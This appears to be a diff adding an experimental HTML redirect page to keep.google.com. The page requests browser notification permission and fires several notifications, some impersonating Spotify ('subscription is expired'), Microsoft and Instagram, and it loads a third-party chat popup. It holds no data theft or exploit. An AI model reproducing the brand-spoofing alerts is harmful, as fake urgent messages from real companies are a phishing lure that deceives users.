@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="notifcation.js"></script>
+	<meta charset="UTF-8">
+	<title>Redirecting...</title>
+	<script>
+		// Define the URL to redirect to
+		var url = "https://keep.google.com/";
+		
+		// Set a timeout of 1 minute (60000 milliseconds)
+		setTimeout(function() {
+			// Redirect to the URL
+			window.location.href = url;
+		}, 30000);
+	</script>
+</head>
+<body>
+    <script>Notification.requestPermission().then(function(permission) {
+        if (permission === "granted") {
+          var notification = new Notification("Spotify Premium", {
+            body: "Your subscription is expired !",
+            icon: "icon.png"
+          });
+        }
+      });
+      if ('Notification' in window) {
+  if (Notification.permission === 'granted') {
+    new Notification('Hello User', {
+      body: 'A New Message from Microsoft.',
+      icon: 'icon.png',
+      image: 'image.png'
+    });
+  } else if (Notification.permission !== 'denied') {
+    Notification.requestPermission().then(function (permission) {
+      if (permission === 'granted') {
+        new Notification('Notification with Image', {
+          body: 'This is a notification with an image.',
+          icon: 'icon.png',
+          image: 'image.png'
+        });
+      }
+    });
+  }
+}
+if ('Notification' in window) {
+  if (Notification.permission === 'granted') {
+    new Notification('https://www.instagram.com/', {
+      body: 'You have 1 new notification.',
+      icon: 'icon.png'
+    });
+  } else if (Notification.permission !== 'denied') {
+    Notification.requestPermission().then(function (permission) {
+      if (permission === 'granted') {
+        new Notification('Simple Notification', {
+          body: 'This is a simple notification.',
+          icon: 'notification-icon.png'
+        });
+      }
+    });
+  }
+}
+// Check if the browser supports notifications
+if ("Notification" in window) {
+  // Request permission to display notifications
+  Notification.requestPermission().then(function(permission) {
+    if (permission === "granted") {
+      // Create the notification
+      var notification = new Notification("Example Notification", {
+        body: "This is an example notification with HTML <b>bold text</b>.",
+        icon: "icon.png",
+        // Set the innerHTML property to include HTML in the notification body
+        data: {
+          innerHTML: "<b>Test</b>"
+        }
+      });
+    }
+  });
+}
+
+if ('Notification' in window) {
+  if (Notification.permission === 'granted') {
+    new Notification('Notification with Actions', {
+      body: 'This is a notification with actions.',
+      icon: 'icon.png',
+      actions: [
+        { action: 'yes', title: 'Yes' },
+        { action: 'no', title: 'No' }
+      ]
+    });
+  } else if (Notification.permission !== 'denied') {
+    Notification.requestPermission().then(function (permission) {
+      if (permission === 'granted') {
+        new Notification('Notification with Actions', {
+          body: 'This is a notification with actions.',
+          icon: 'icon.png',
+          actions: [
+            { action: 'yes', title: 'Yes' },
+            { action: 'no', title: 'No' }
+          ]
+        });
+      }
+    });
+  }
+}
+
+      </script>
+<script>
+  window.addEventListener('mouseover', initLandbot, { once: true });
+  window.addEventListener('touchstart', initLandbot, { once: true });
+  var myLandbot;
+  function initLandbot() {
+    if (!myLandbot) {
+      var s = document.createElement('script');s.type = 'text/javascript';s.async = true;
+      s.addEventListener('load', function() {
+        myLandbot = new Landbot.Popup({
+          configUrl: 'https://storage.googleapis.com/landbot.online/v3/H-1493158-CHOV9UXH58Y68CSR/index.json',
+        });
+      });
+      s.src = 'https://cdn.landbot.io/landbot-3/landbot-3.0.0.js';
+      var x = document.getElementsByTagName('script')[0];
+      x.parentNode.insertBefore(s, x);
+    }
+  }
+  </script>
+	<p>Redirecting to <a href="https://keep.google.com/">https://keep.google.com/</a> in 1 minute...</p>
+</body>
+</html>
+<a href="https://www.example.com,https://www.another-example.com">Open multiple URLs</a>
